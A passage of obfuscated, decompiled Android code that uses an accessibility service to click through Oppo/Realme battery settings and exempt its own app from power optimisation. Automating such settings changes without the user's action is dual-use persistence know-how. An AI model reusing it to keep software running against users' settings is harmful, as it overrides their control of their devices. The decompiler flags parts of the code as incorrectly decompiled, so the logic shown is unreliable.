                                                                                                                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 47;
                                                                                                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                                            if (c0368a5.m212313a8("待机优化")) {
                                                                                                                                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 48;
                                                                                                                                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                                                    c0368a5.m212313a8("关闭");
                                                                                                                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = null;
                                                                                                                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 49;
                                                                                                                                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                            }
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                    return c1351vv;
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                kg1.m213544f4(objM212314a92);
                return c1351vv;
            case 2:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 3;
                if (c0368a53.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 4;
                if (c0368a53.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a53.m212313a8("省电设置");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 5;
                if (c0368a53.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a53.m212315b2("睡眠待机优化");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 6;
                j = 100;
                if (c0368a53.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j = 100;
                c0368a53.m212315b2("自动进入省电模式");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 7;
                if (c0368a53.m212354f9(j, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 8;
                if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                oppoStepsSimplified$mRealme$1.f54619a3 = 9;
                if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c0368a53 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = null;
                oppoStepsSimplified$mRealme$1.f54619a3 = 10;
                if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                break;
            case 10:
                kg1.m213544f4(objM212314a92);
                return c1351vv;
            case oe0.DEFAULT_M /* 11 */:
                c0368a52 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                str = "睡眠待机优化";
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                oppoStepsSimplified$mRealme$1.f54619a3 = 12;
                if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0368a52 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                str = "睡眠待机优化";
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                oppoStepsSimplified$mRealme$1.f54619a3 = 13;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                c0368a52 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                str = "睡眠待机优化";
                c0368a52.m212315b2("省电模式");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                oppoStepsSimplified$mRealme$1.f54619a3 = 14;
                if (c0368a52.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c0368a52 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                str = "睡眠待机优化";
                c0368a52.m212313a8("智能省电场景");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                oppoStepsSimplified$mRealme$1.f54619a3 = 15;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0368a52 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                str = "睡眠待机优化";
                c0368a52.m212315b2(str);
                oppoStepsSimplified$mRealme$1.f54616a0 = null;
                oppoStepsSimplified$mRealme$1.f54619a3 = 16;
                if (c0368a52.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                break;
            case 16:
                kg1.m213544f4(objM212314a92);
                return c1351vv;
            case 17:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 18;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 18:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 19;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (!c0368a5.m212313a8("省电模式")) {
                }
                return coroutineSingletons;
            case 20:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a5.m212315b2("省电模式");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 21;
                j2 = 100;
                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 21:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j2 = 100;
                c0368a5.m212315b2("充电至 90% 自动关闭");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 22;
                if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 22:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j2 = 100;
                c0368a5.m212315b2("设定自动开启电量");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 23;
                if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 23:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j2 = 100;
                c0368a5.m212315b2("超级省电模式");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 24;
                if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (!c0368a5.m212313a8("省电模式优化项")) {
                }
                return coroutineSingletons;
            case 25:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a5.m212315b2("降低屏幕亮度");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 26;
                j3 = 100;
                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 26:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j3 = 100;
                c0368a5.m212315b2("自动息屏时间调整为15秒");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 27;
                if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 27:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j3 = 100;
                c0368a5.m212315b2("停用后台同步功能");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 28;
                if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 28:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                j3 = 100;
                c0368a5.m212315b2("降低屏幕刷新率");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 29;
                if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 29:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 30;
                if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 30:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 31;
                if (c0368a5.m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 31:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 32;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 32:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 33;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 33:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 34;
                objM212314a9 = c0368a5.m212314a9("更多设置#高级设置#更多", 5, oppoStepsSimplified$mRealme$1);
                if (objM212314a9 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 34:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                objM212314a9 = objM212314a92;
                if (!((Boolean) objM212314a9).booleanValue()) {
                }
                return coroutineSingletons;
            case 35:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (!c0368a5.m212313a8("耗电异常优化")) {
                }
                return coroutineSingletons;
            case 36:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 37;
                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 37:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                String strM212334d72 = c0368a5.m212334d7();
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 38;
                objM212314a92 = c0368a5.m212314a9(strM212334d72, 25, oppoStepsSimplified$mRealme$1);
                if (objM212314a92 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 38:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (!((Boolean) objM212314a92).booleanValue()) {
                }
                return coroutineSingletons;
            case 39:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a5.m212313a8("不优化");
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 40;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 40:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 41;
                if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 41:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 42;
                if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 42:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 43;
                if (c0368a5.m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 43:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 44;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 44:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 45;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 45:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                oppoStepsSimplified$mRealme$1.f54619a3 = 46;
                objM212314a92 = c0368a5.m212314a9("更多设置#高级设置#更多", 5, oppoStepsSimplified$mRealme$1);
                if (objM212314a92 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 46:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (((Boolean) objM212314a92).booleanValue()) {
                }
                return c1351vv;
            case 47:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                if (c0368a5.m212313a8("待机优化")) {
                }
                return c1351vv;
            case 48:
                c0368a5 = oppoStepsSimplified$mRealme$1.f54616a0;
                kg1.m213544f4(objM212314a92);
                c0368a5.m212313a8("关闭");
                oppoStepsSimplified$mRealme$1.f54616a0 = null;
                oppoStepsSimplified$mRealme$1.f54619a3 = 49;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                }
                break;
            case 49:
                kg1.m213544f4(objM212314a92);
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: e5 */
    public final void m212341e5(String str) {
        ((SharedPreferences) this.f55128b7.getValue()).edit().putBoolean(str, true).apply();
        m212303e0("✅ 标记完成: " + str);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(12:0|2|(2:4|(1:6)(1:8))(0)|7|9|(1:60)|(1:(1:(9:13|14|15|32|(1:38)|(3:43|(3:46|(2:64|48)(1:65)|44)|63)(1:42)|49|56|57)(2:18|19))(3:20|21|22))(5:23|61|24|(1:27)|30)|58|28|(5:31|32|(3:34|38|(5:40|43|(1:44)|63|49)(0))(0)|56|57)|30|(1:(0))) */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x0130, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x0131, code lost:
    
        r3 = r8;
     */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00da  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x00e5 A[Catch: Exception -> 0x003f, TryCatch #1 {Exception -> 0x003f, blocks: (B:14:0x0039, B:32:0x00c8, B:34:0x00ce, B:36:0x00d4, B:40:0x00de, B:49:0x0116, B:43:0x00e5, B:44:0x00e9, B:46:0x00ef, B:48:0x00fb, B:21:0x004e), top: B:60:0x002f }] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00ef A[Catch: Exception -> 0x003f, TryCatch #1 {Exception -> 0x003f, blocks: (B:14:0x0039, B:32:0x00c8, B:34:0x00ce, B:36:0x00d4, B:40:0x00de, B:49:0x0116, B:43:0x00e5, B:44:0x00e9, B:46:0x00ef, B:48:0x00fb, B:21:0x004e), top: B:60:0x002f }] */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0020  */
    /* renamed from: e6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212342e6(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$openAppDetails$1 oppoStepsSimplified$openAppDetails$1;
        List list;
        C0368a5 c0368a5;
        boolean z;
        C0368a5 c0368a52;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8;
        String string;
        Iterator it;
        CharSequence packageName;
        long j = this.f55122b1;
        Context context = this.f55112a1;
        if (continuationImpl instanceof OppoStepsSimplified$openAppDetails$1) {
            oppoStepsSimplified$openAppDetails$1 = (OppoStepsSimplified$openAppDetails$1) continuationImpl;
            int i = oppoStepsSimplified$openAppDetails$1.f54624a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$openAppDetails$1.f54624a4 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$openAppDetails$1 = new OppoStepsSimplified$openAppDetails$1(this, continuationImpl);
            }
        }
        OppoStepsSimplified$openAppDetails$1 oppoStepsSimplified$openAppDetails$12 = oppoStepsSimplified$openAppDetails$1;
        Object obj = oppoStepsSimplified$openAppDetails$12.f54622a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$openAppDetails$12.f54624a4;
        boolean z2 = false;
        try {
        } catch (Exception e) {
            e = e;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            List listM213306g5 = AbstractC0716jf.m213306g5("com.android.settings", "com.oplus.settings", "com.coloros.settings", "com.oppo.settings", "com.oneplus.settings", "com.realme.settings");
            try {
                Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.setFlags(276856832);
                context.startActivity(intent);
                m212303e0("[导航] 打开应用详情，等待" + j + "ms...");
                oppoStepsSimplified$openAppDetails$12.f54620a0 = this;
                oppoStepsSimplified$openAppDetails$12.f54621a1 = listM213306g5;
                oppoStepsSimplified$openAppDetails$12.f54624a4 = 1;
                if (b81.m210571b1(j, oppoStepsSimplified$openAppDetails$12) != coroutineSingletons) {
                    list = listM213306g5;
                    c0368a5 = this;
                }
                return coroutineSingletons;
            } catch (Exception e2) {
                e = e2;
                C0368a5 c0368a53 = this;
                String str = "[导航] ❌ 打开应用详情异常: " + e.getMessage();
                c0368a53.getClass();
                m212303e0(str);
                return Boolean.valueOf(z2);
            }
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            list = oppoStepsSimplified$openAppDetails$12.f54621a1;
            c0368a52 = oppoStepsSimplified$openAppDetails$12.f54620a0;
            kg1.m213544f4(obj);
            z = true;
            accessibilityNodeInfoM212335d8 = c0368a52.m212335d8();
            if (accessibilityNodeInfoM212335d8 != null || (packageName = accessibilityNodeInfoM212335d8.getPackageName()) == null || (string = packageName.toString()) == null) {
                string = "";
            }
            if (list != null || !list.isEmpty()) {
                it = list.iterator();
                while (it.hasNext()) {
                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), z)) {
                        m212303e0("[导航] ✅ 应用详情打开成功 (包名: " + string + ")");
                        z2 = z;
                        break;
                    }
                }
            }
            m212303e0("[导航] ⚠️ 应用详情可能未打开，当前包名: " + string);
            c0368a52.m212317b5("打开应用详情后的页面");
            return Boolean.valueOf(z2);
        }
        list = oppoStepsSimplified$openAppDetails$12.f54621a1;
        C0368a5 c0368a54 = oppoStepsSimplified$openAppDetails$12.f54620a0;
        kg1.m213544f4(obj);
        c0368a5 = c0368a54;
        oppoStepsSimplified$openAppDetails$12.f54620a0 = c0368a5;
        oppoStepsSimplified$openAppDetails$12.f54621a1 = list;
        oppoStepsSimplified$openAppDetails$12.f54624a4 = 2;
        z = true;
        if (c0368a5.m212351f6(2, 150L, 1500L, oppoStepsSimplified$openAppDetails$12) != coroutineSingletons) {
            c0368a52 = c0368a5;
            accessibilityNodeInfoM212335d8 = c0368a52.m212335d8();
            if (accessibilityNodeInfoM212335d8 != null) {
                string = "";
                if (list != null) {
                    it = list.iterator();
                    while (it.hasNext()) {
                    }
                    m212303e0("[导航] ⚠️ 应用详情可能未打开，当前包名: " + string);
                    c0368a52.m212317b5("打开应用详情后的页面");
                }
            }
            return Boolean.valueOf(z2);
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: e7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212343e7(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$openAppDetailsSmali$1 oppoStepsSimplified$openAppDetailsSmali$1;
        C0368a5 c0368a5;
        Context context = this.f55112a1;
        if (continuationImpl instanceof OppoStepsSimplified$openAppDetailsSmali$1) {
            oppoStepsSimplified$openAppDetailsSmali$1 = (OppoStepsSimplified$openAppDetailsSmali$1) continuationImpl;
            int i = oppoStepsSimplified$openAppDetailsSmali$1.f54628a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$openAppDetailsSmali$1.f54628a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$openAppDetailsSmali$1 = new OppoStepsSimplified$openAppDetailsSmali$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$openAppDetailsSmali$1.f54626a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$openAppDetailsSmali$1.f54628a3;
        boolean z = true;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(276856832);
                context.startActivity(intent);
                oppoStepsSimplified$openAppDetailsSmali$1.f54625a0 = this;
                oppoStepsSimplified$openAppDetailsSmali$1.f54628a3 = 1;
                if (m212354f9(500L, oppoStepsSimplified$openAppDetailsSmali$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "[] openAppDetails 异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                z = false;
                return Boolean.valueOf(z);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$openAppDetailsSmali$1.f54625a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "[] openAppDetails 异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                z = false;
                return Boolean.valueOf(z);
            }
        }
        return Boolean.valueOf(z);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: e8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212344e8(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$openSettingsSmali$1 oppoStepsSimplified$openSettingsSmali$1;
        C0368a5 c0368a5;
        if (continuationImpl instanceof OppoStepsSimplified$openSettingsSmali$1) {
            oppoStepsSimplified$openSettingsSmali$1 = (OppoStepsSimplified$openSettingsSmali$1) continuationImpl;
            int i = oppoStepsSimplified$openSettingsSmali$1.f54632a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$openSettingsSmali$1.f54632a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$openSettingsSmali$1 = new OppoStepsSimplified$openSettingsSmali$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$openSettingsSmali$1.f54630a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$openSettingsSmali$1.f54632a3;
        boolean z = true;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                Context context = this.f55112a1;
                Intent intent = new Intent("android.settings.SETTINGS");
                intent.addFlags(1350631424);
                context.startActivity(intent);
                oppoStepsSimplified$openSettingsSmali$1.f54629a0 = this;
                oppoStepsSimplified$openSettingsSmali$1.f54632a3 = 1;
                if (m212354f9(500L, oppoStepsSimplified$openSettingsSmali$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "[] openSettings 异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                z = false;
                return Boolean.valueOf(z);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$openSettingsSmali$1.f54629a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "[] openSettings 异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                z = false;
                return Boolean.valueOf(z);
            }
        }
        return Boolean.valueOf(z);
    }

    /* renamed from: e9 */
    public final Object m212345e9(ContinuationImpl continuationImpl) throws Throwable {
        this.f55111a0.performGlobalAction(1);
        Object objM212354f9 = m212354f9(100L, continuationImpl);
        return objM212354f9 == CoroutineSingletons.f57606a0 ? objM212354f9 : C1351vv.f60710b1;
    }

    /* renamed from: f1 */
    public final void m212346f1() {
        float f = this.f55112a1.getResources().getDisplayMetrics().widthPixels;
        float f2 = 0.8f * f;
        float f3 = f * 0.2f;
        float f4 = r0.heightPixels * 0.4f;
